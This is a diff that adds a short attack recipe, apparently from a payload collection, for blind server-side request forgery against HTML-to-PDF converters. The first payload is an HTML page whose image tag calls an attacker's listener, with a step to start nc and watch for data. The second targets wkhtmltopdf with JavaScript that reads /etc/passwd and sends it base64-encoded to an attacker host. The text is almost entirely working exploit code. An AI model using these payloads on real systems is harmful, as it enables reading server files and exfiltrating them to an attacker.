@@ -1,0 +1,36 @@
+
+1. Create a html file:
+
+<!DOCTYPE html>
+<html>
+<body>
+	<a>Hello World!</a>
+	<img src="http://<LOCAL-IP>:PORT/x?=viaimgtag">
+</body>
+</html>
+
+2. Start nc listener and watch for incoming data
+
+------------------------------------------------------
+
+In case of 'wkhtmltopdf', it's possible to execute Javascript:
+
+<html>
+    <body>
+        <b>Exfiltration via Blind SSRF</b>
+        <script>
+        var readfile = new XMLHttpRequest(); // Read the local file
+        var exfil = new XMLHttpRequest(); // Send the file to our server
+        readfile.open("GET","file:///etc/passwd", true); 
+        readfile.send();
+        readfile.onload = function() {
+            if (readfile.readyState === 4) {
+                var url = 'http://<LOCAL-IP>:PORT/?data='+btoa(this.response);
+                exfil.open("GET", url, true);
+                exfil.send();
+            }
+        }
+        readfile.onerror = function(){document.write('<a>Oops!</a>');}
+        </script>
+     </body>
+</html>
